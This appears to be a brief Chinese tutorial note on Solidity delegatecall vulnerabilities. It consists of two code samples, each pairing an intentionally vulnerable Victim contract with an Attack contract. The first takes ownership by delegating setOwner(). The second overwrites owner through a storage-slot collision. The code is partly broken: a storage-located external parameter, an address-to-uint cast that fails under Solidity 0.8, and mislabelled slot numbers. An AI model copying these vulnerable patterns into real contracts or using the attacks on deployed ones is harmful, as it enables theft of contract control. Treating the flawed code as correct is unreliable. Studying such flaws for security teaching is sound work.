delegatecall的特定：

1. 保留传递过程中的上下文
2. 变量名称和顺序必须一致，根据内存布局一一对应，如果对应不一致，则有会导致变量存储混乱和额外的风险

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Called {
    address public owner;

    function setOwner() external {
        owner = msg.sender;
    }
}

contract Victim {
    address public owner;
    Called called;

    constructor(address _addr) {
        owner = msg.sender;
        called = Called(_addr);
    }

    //由于使用delegatecall，被外部调用时，使用外部的上下文，msg.sender等信息
    //由由于修改的本地变量，如此owner就变成了攻击者的address
    function callout(bytes storage _data) external {
        address(called).delegatecall(msg.data);
    }
}

contract Attack {
    Victim victim;

    constructor(address _addr) {
        victim = Victim(_addr);
    }

    function attack() external {
        victim.callout(abi.encodeWithSignature("setOwner()"));
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Called {
    uint public count;//slot1

    function setCount(uint _count) external {
        count = _count;
    }
}

contract Victim {
    address public owner;//slot1
    uint public count;//slot2
    Called called;

    constructor(address _addr) {
        owner = msg.sender;
        called = Called(_addr);
    }

    //由于内存布局是根据slot一一对应，攻击者通过某种方法将address转为uint，
    //在修改count时实际上影响的是owner的值，从而修改了owner
    function callout(uint _count) external {
        address(called).delegatecall(abi.encodeWithSignature("setCount(uint256)", _count));
    }
}

contract Attack {
    Victim victim;

    constructor(address _addr) {
        victim = Victim(_addr);
    }

    function attack() external {
        victim.callout(uint(address(this)));
    }
}
```